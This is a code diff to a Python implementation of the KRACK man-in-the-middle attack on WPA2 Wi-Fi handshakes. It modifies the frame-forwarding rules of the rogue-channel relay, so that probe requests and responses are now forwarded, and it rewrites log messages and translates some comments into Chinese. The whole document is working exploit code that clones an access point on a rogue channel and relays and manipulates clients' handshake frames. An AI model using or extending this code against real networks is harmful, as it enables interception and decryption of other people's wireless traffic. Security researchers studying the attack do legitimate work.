@@ -397,6 +397,8 @@ class ClientState():
 			# Forwarding rules when attacking the group handshake
 			return True
 		else:
+			if p.haslayer(Dot11ProbeReq) | p.haslayer(Dot11ProbeResp):
+				return True
 			# Forwarding rules when attacking the 4-way handshake
 			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
 				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
@@ -687,34 +689,36 @@ class KRAckAttack():
 		p, origin_p = self.sock_rogue.recv()
 		if p == None: return
 
-		# 1. 處理來自強盜 AP 的 frames
+		# 1. 處理來自原本 AP 的 frames
 		if p.addr2 == self.apmac:
 			# Track time of last beacon we received. Verify channel to assure it's not the real AP.
 			if p.haslayer(Dot11Beacon) and ord(get_tlv_value(p, IEEE_TLV_TYPE_CHANNEL)) == self.netconfig.rogue_channel:
 				self.last_rogue_beacon = time.time()
 			# Display all frames sent to the targeted client
 			if self.clientmac is not None and p.addr1 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
+				print_rx(INFO, "Rogue channel", p, suffix=" -- receive")
 
-		# 2. Handle frames sent TO the AP
+		# 2. 處理送往原本 AP 的 frames
 		elif p.addr1 == self.apmac:
 			client = None
-
-			# Check if it's a new client that we can MitM
+			# 檢查是不是新的client端，that we can MitM
 			if p.haslayer(Dot11Auth):
 				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
 				will_forward = True
-			# Otherwise check of it's an existing client we are tracking/MitM'ing
+			# 否則，確認是否是正在追蹤的client端，that we are tracking/MitM'ing
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
 				will_forward = client.should_forward(p)
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+				if (will_forward):
+					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				else:
+					print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 			# Always display all frames sent by the targeted client
 			elif p.addr2 == self.clientmac:
-				print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
+				print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 
 			# If this now belongs to a client we want to track, process the packet further
 			if client is not None:
@@ -736,13 +740,11 @@ class KRAckAttack():
 					# Don't mark client as sleeping when we haven't got two Msg3's and performed the attack
 					if client.state < ClientState.Attack_Started:
 						origin_p.FCfield &= 0xFFEF
-
 					self.sock_real.send(origin_p)
-
 
 		# 3. Always display all frames sent by or to the targeted client
 		elif p.addr1 == self.clientmac or p.addr2 == self.clientmac:
-			print_rx(INFO, "Rogue channel", p, suffix=" --no forward !!")
+			print_rx(INFO, "Rogue channel", p, suffix=" -- no forward")
 
 	def handle_hostapd_out(self):
 		# hostapd always prints lines so this should not block
